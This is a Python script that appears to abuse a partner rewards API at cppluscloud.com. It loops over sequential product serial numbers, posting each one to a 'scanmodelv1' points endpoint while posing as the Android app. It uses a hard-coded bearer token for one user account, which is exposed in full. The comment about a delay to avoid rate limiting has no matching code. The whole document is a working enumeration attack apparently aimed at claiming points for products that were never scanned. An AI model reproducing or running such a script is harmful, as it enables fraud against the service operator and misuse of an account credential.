import requests
import json
import time

# Fixed headers and body parameters
url = "https://partnerrest.cppluscloud.com/api/T2Pointmall/scanmodelv1"
headers = {
    "Authorization": "Bearer eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNobWFjLXNoYTI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiaWJyIDM2MCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiNDU3OTYiLCJuYmYiOjE3NTQyMTQ4NzIsImV4cCI6MTc1NDIxODQ3MiwiaXNzIjoiQ1BQYXJ0bmVyQ1JNIiwiYXVkIjpbIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSIsIkFueW9uZSJdfQ.V8Hc1OeTA6NG1OlzBoSCakZwyeRKHebFYVhoar0SuE4",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "okhttp/3.10.0"
}

# Starting serial number
serial_number = 2209012515002618

while True:
    # Prepare the request body
    payload = {
        "userid": 45796,
        "devicetype": "ANDROID",
        "deviceversion": "3.5",
        "modelwithserail": [
            {
                "model": "NA",
                "serail": [
                    {"seialnumber": str(serial_number)}
                ]
            }
        ]
    }

    # Send POST request
    response = requests.post(url, headers=headers, json=payload)

    # Check response
    if response.status_code == 200:
        print(f"[✓] Success for serial: {serial_number}")
        print(response.json())  # Optional: print API response
        serial_number += 1
    else:
        print(f"[✗] Failed for serial: {serial_number} - Status: {response.status_code}")
        print(response.text)
        break  # You can remove this if you want it to keep retrying

     # Delay between requests to avoid being rate-limited
